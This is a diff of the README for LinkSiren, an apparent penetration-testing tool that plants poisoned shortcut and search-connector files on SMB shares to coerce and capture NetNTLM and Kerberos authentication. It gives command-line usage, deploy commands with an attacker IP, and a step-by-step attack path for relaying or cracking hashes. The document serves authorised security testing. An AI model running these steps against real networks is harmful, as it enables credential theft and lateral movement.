@@ -4,7 +4,7 @@ _The Siren waits thee, singing song for song._ - Walter Savage Landor
 LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to accessible file shares to coerce NetNTLM and Kerberos authentication over SMB and HTTP from hosts that open them. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for coercion and has scalable deployment and cleanup built in.
 
 # Installation
-## Install using pipx (Recommended)
+Using pipx (Recommended)
 ```
 # Install pipx if necessary
 python3 -m pip install pipx
@@ -12,12 +12,11 @@ pipx ensurepath
 
 # Install linksiren
 pipx install linksiren
-
-# Run with -h to output help info
-linksiren -h
 ```
 
-## Install from source
+<details>
+<summary>Alternatively, install from source</summary>
+
 ```
 # Download source code
 git clone https://github.com/gjhami/LinkSiren.git
@@ -30,172 +29,28 @@ source ./.venv/bin/activate # Linux
 
 # Install requirements
 python -m pip install -r requirements.txt
-
-# Run with -h to output help info
-python ./src/linksiren/__main__.py -h
 ```
 
-# Usage
-LinkSiren offers the following modes of operation:
+</details>
 
-## Generate
-Create poisoned files to use for coercion and store them locally.
-```
-linksiren generate --help
-usage: linksiren generate [-h] -a ATTACKER [-n PAYLOAD]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -n PAYLOAD, --payload PAYLOAD
-                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms,
-                        .searchConnector-ms, .lnk, or .url
-
-Required Arguments:
-  -a ATTACKER, --attacker ATTACKER
-                        Attacker IP or hostname to place in malicious URL
-```
-
-## Rank
-Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
-```
-linksiren rank --help
-usage: linksiren rank [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -md MAX_DEPTH, --max-depth MAX_DEPTH
-                        (Default: 3) The maximum depth of folders to search within the target.
-  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
-                        (Default: 2) Number of days as an integer for active files.
-  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on.
-                        Ranks are all set to 1 assigned.
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to file shares / base directories within which to rank
-                        folders as potential locations for placing poisoned files.
-```
-
-## Identify
-Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
-```
-linksiren identify --help
-usage: linksiren identify [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
-                              [-mf MAX_FOLDERS_PER_TARGET]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -md MAX_DEPTH, --max-depth MAX_DEPTH
-                        (Default: 3) The maximum depth of folders to search within the target
-  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
-                        (Default: 2) Max number of days since within which a file is considered active.
-  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on.
-                        Ranks are all set to 1.
-  -mf MAX_FOLDERS_PER_TARGET, --max-folders-per-target MAX_FOLDERS_PER_TARGET
-                        (Default: 10) Maximum number of folders to output as deployment targets per supplied target share or
-                        folder.
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to file shares / base directories for deployment or from
-                        which to remove payload files
-```
-
-## Deploy
-Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.
-```
-linksiren deploy --help
-usage: linksiren deploy [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -n PAYLOAD, --payload PAYLOAD
-                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms,
-                        .searchConnector-ms, .lnk, or .url
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to folders into which poisoned files will be deployed.
-  -a ATTACKER, --attacker ATTACKER
-                        Attacker IP or hostname to place in poisoned files.
-```
-
-## Cleanup
-Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.
-```
-linksiren cleanup --help
-usage: linksiren cleanup [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -n PAYLOAD, --payload PAYLOAD
-                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms,
-                        .searchConnector-ms, .lnk, or .url
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to folders in which poisoned files are located.
-  -a ATTACKER, --attacker ATTACKER
-                        Attacker IP or hostname to place in poisoned files.
-```
-
-## Attack Overview
-1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse).
-2. Create a list of UNC paths to writeable SMB shares.
-    - Note: Make sure you can delete files in them for cleanup.
-3. [Optional] Run LinkSiren in `generate` mode to write templates locally
-4. [Optional] Run LinkSiren in `rank` mode to output rankings for accessible folders based on recent access.
-5. Run LinkSiren in `identify` mode to find the best places to put poisoned files.
-6. Start a listener or relay on your attacker machine to capture and/or relay coerced authentication.
-7. Run LinkSiren in `deploy` mode to place payloads in the optimal locations identified.
-8. Let the hashes roll in. Relay and/or crack as desired.
-9. Run LinkSiren in `cleanup` mode to delete all the poisoned files.
-
-## What Payload Type Should I Use?
-Search Connectors (.searchConnector-ms): This is generally the best option. They require the least amount of interaction, start the WebClient service from a stopped state automatically, and are capable of coercing both SMB and HTTP authentication using a single file.
-
-## How do I use this NOW?
+# How do I use this NOW?
 ```bash
 # Install using pipx
 pipx install linksiren
 
 # Identify optimal locations for poisoned file deployment
-linksiren identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
+linksiren identify --targets <shares file> [domain]/username[:password]
 
 # Deploy to identified locations
-linksiren deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
+linksiren deploy --targets folder_targets.txt --attacker <attacker IP> [domain]/username[:password]
 
 # Capture hashes / relay authentication
 
 # Cleanup poisoned files
-linksiren cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
+linksiren cleanup --targets payloads_written.txt [domain]/username[:password]
 ```
 
-## How do I use this the \~right\~ way?
+# How do I use this the \~right\~ way?
 ```bash
 # Install using pipx
 pipx install linksiren
@@ -206,11 +61,11 @@ pipx install linksiren
 # 2. Use LinkSiren to identify the most active folders on them
 #    Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
 #    Note: Specify '.' as the domain to log in using a local user account
-linksiren identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
+linksiren identify --targets <shares file> [domain]/username[:password]
 
 # 3. Use LinkSiren to deploy payloads to all of the active folders
 #    --identify saves UNC paths to active folders in folder_targets.txt
-linksiren deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
+linksiren deploy --targets folder_targets.txt --attacker <attacker IP> [domain]/username[:password]
 
 # 4. Let the hashes come to you and relay them as you see fit :)
 #    Use CrackMapExec and LdapRelayScan for relay target identification
@@ -222,8 +77,148 @@ linksiren deploy --username <username> --password <password> --domain <domain.tl
 #    Set targets to a file containing UNC paths of all folders where payloads were written
 #    --deploy saves UNC paths to deployed payloads in payload_folders.txt
 #    Note: If you set a custom payload name (--payload) when deploying, you must set the same name here
-linksiren cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
+linksiren cleanup --targets payloads_written.txt [domain]/username[:password]
 ```
+
+# What is the Attack Path?
+1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse).
+2. Create a list of UNC paths to writeable SMB shares.
+    - Note: Make sure you can delete files in them for cleanup.
+3. [Optional] Run LinkSiren in `generate` mode to write templates locally
+4. [Optional] Run LinkSiren in `rank` mode to output rankings for accessible folders based on recent access.
+5. Run LinkSiren in `identify` mode to find the best places to put poisoned files.
+6. Start a listener or relay on your attacker machine to capture and/or relay coerced authentication to services without Signing/Channel Binding like LDAP, MSSQL, SMB, AD CS (HTTP), and others.
+7. Run LinkSiren in `deploy` mode to place payloads in the optimal locations identified.
+8. Let the hashes roll in. Relay and/or crack as desired.
+9. Run LinkSiren in `cleanup` mode to delete all the poisoned files.
+
+# Modes
+LinkSiren offers the following modes of operation:
+
+## Generate
+Create poisoned files to use for coercion and store them locally.
+
+<details>
+<summary>Usage</summary>
+
+```
+linksiren generate --help
+usage: linksiren generate [-h] -a ATTACKER [-n PAYLOAD]
+
+options:
+  -h, --help            show this help message and exit
+  -n PAYLOAD, --payload PAYLOAD
+                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
+
+Required Arguments:
+  -a ATTACKER, --attacker ATTACKER
+                        Attacker IP or hostname to place in malicious URL
+```
+</details>
+
+## Rank
+Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
+
+<details>
+<summary>Usage</summary>
+
+```
+linksiren rank --help
+usage: linksiren rank [-h] -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] credentials
+
+options:
+  -h, --help            show this help message and exit
+  -md MAX_DEPTH, --max-depth MAX_DEPTH
+                        (Default: 3) The maximum depth of folders to search within the target.
+  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
+                        (Default: 2) Number of days as an integer for active files.
+  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1 assigned.
+
+Required Arguments:
+  credentials           [domain/]username[:password] for authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to file shares / base directories within which to rank folders as potential locations for
+                        placing poisoned files.
+```
+</details>
+
+## Identify
+Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
+
+<details>
+<summary>Usage</summary>
+
+```
+linksiren identify --help
+usage: linksiren identify [-h] -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-mf MAX_FOLDERS_PER_TARGET] credentials
+
+options:
+  -h, --help            show this help message and exit
+  -md MAX_DEPTH, --max-depth MAX_DEPTH
+                        (Default: 3) The maximum depth of folders to search within the target
+  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
+                        (Default: 2) Max number of days since within which a file is considered active.
+  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1.
+  -mf MAX_FOLDERS_PER_TARGET, --max-folders-per-target MAX_FOLDERS_PER_TARGET
+                        (Default: 10) Maximum number of folders to output as deployment targets per supplied target share or folder.
+
+Required Arguments:
+  credentials           [domain/]username[:password] for authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to file shares / base directories for deployment or from which to remove payload files
+```
+
+</details>
+
+## Deploy
+Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.
+
+<details>
+<summary>Usage</summary>
+
+```
+linksiren deploy --help
+usage: linksiren deploy [-h] -t TARGETS -a ATTACKER [-n PAYLOAD] credentials
+
+options:
+  -h, --help            show this help message and exit
+  -n PAYLOAD, --payload PAYLOAD
+                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
+
+Required Arguments:
+  credentials           [domain/]username[:password] for authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to folders into which poisoned files will be deployed.
+  -a ATTACKER, --attacker ATTACKER
+                        Attacker IP or hostname to place in poisoned files.
+```
+</details>
+
+## Cleanup
+Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.
+
+<details>
+<summary>Usage</summary>
+
+```
+linksiren cleanup --help
+usage: linksiren cleanup [-h] -t TARGETS [-n PAYLOAD] credentials
+
+options:
+  -h, --help            show this help message and exit
+  -n PAYLOAD, --payload PAYLOAD
+                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
+
+Required Arguments:
+  credentials           [domain/]username[:password] for authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to folders in which poisoned files are located.
+```
+
+</details>
+
+## What Payload Type Should I Use?
+Search Connectors (.searchConnector-ms): This is generally the best option. They require the least amount of interaction, start the WebClient service from a stopped state automatically, and are capable of coercing both SMB and HTTP authentication using a single file.
 
 ## How is this better than the other tools?
 As in real estate, the three most important things when attempting to coerce auth using files: location, location, location. All techniques identified here only coerce authentication from users that open the folder containing the poisoned file.
@@ -240,33 +235,21 @@ Summary
 
 ## How will you make it even better?
 I'm looking to add the following features:
-- [x] Start the WebClient service on targets using searchConnector-ms and library-ms files (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#start-the-webclient-service) and [Farmer Source Code](https://github.com/mdsecactivebreach/Farmer/blob/main/crop/Crop/Crop.cs))
-- [x] Coerce HTTP authentication with WebDAV connection strings (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse))
-- [ ] Add a safe mode that checks if a file can be deleted from a target share before deploying it.
-    - This can be accomplished by reviewing ACLs over SMB but is only useful if the SIDs in the ACLs can be mapped to the username used to connect to the share. WMI / RPC over SMB could be used to get SID information to map SIDs to usernames (definitely local, maybe also domain). Alternatively, LDAP could be queries for SID information associated with domain users in AD environments.
-    - Alternatively, this could be accomplished by attempting to write a test file to the target directory and then delete it. This is what crackmapexec does.
-- [ ] Add an option for 'invisible' targets for .Library-ms and .searchConnector-ms files where the icon is set to blank and the name is set to a non-printing, valid ASCII character.
-- [ ] Add an instructions sections that details how to get intranet zoned (Blog Post In Progress)
-- [ ] Test for anonymous access to shares
-- [ ] Add an explanation of how this can be used with ntlmrelayx (Blog Post In Progress)
 - [ ] Multithreading/Multiprocessing for faster share crawling
 - [ ] Add a progress bar for share crawling
+- [ ] Add a safe mode that checks if a file can be deleted from a target share before deploying it.
+- [ ] Add an option for 'invisible' targets for .Library-ms and .searchConnector-ms files where the icon is set to blank and the name is set to a non-printing, valid ASCII character.
+- [ ] Test for anonymous access to shares
+- [ ] Add an instructions sections that details how to get intranet zoned (Blog Post In Progress)
+- [ ] Add an explanation of how this can be used with ntlmrelayx (Blog Post In Progress)
 - [ ] Enable authentication using a NTLM hash
 - [ ] Enable ticket based authnentication (Kerberos)
 - [ ] Use a logging package (loguru) to vary output verbosity and log additional actions.
     - [ ] Log all crawl, deployment, and cleanup actions as well as success / failure indicators with timestamps for posterity.
     - [ ] Maintain a file that has payloads that still exist because errors (other than STATUS_OBJECT_NAME_NOT_FOUND) prevented payload deletion.
 - [ ] Add pydantic validation for arguments including targets and output file names.
-- [ ] Use impacket and add compatibility with relayed SMB connections
-    - Our attack would need to be added to [smbattack.py](https://github.com/fortra/impacket/blob/4a62f391cf2c5e60577e0138b01df4fec735d5ed/impacket/examples/ntlmrelayx/attacks/smbattack.py#L57) and would need to accept only an authenticated SMB connection.
-    - The authenticated SMB connection offers features to:
-        - Get the remote hostname with getRemoteHost() and getRemoteName()
-        - List shares via listShare()
-        - Connect to and disconnect from a share via connectTree() disconnectTree()
-        - List directory contents including access times and indicators of file vs directory via listPath() which handles automatically performing connect tree and disconnect tree.
-        - Note: While listing directory contents doesn't require manually creating a tree connection, creating, writing, and deleting a file does.
-        - Deploy a poisoned file via createFile() and writeFile()
-        - Cleanup a poisoned file via deleteFile()
+- [ ] Add compatibility with proxied SMB relay connections created using impacket's ntlmrelayx.
+    - The attack would need to be added to [smbattack.py](https://github.com/fortra/impacket/blob/4a62f391cf2c5e60577e0138b01df4fec735d5ed/impacket/examples/ntlmrelayx/attacks/smbattack.py#L57) and would need to accept only an authenticated SMB connection.
 
 ## Note
 This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
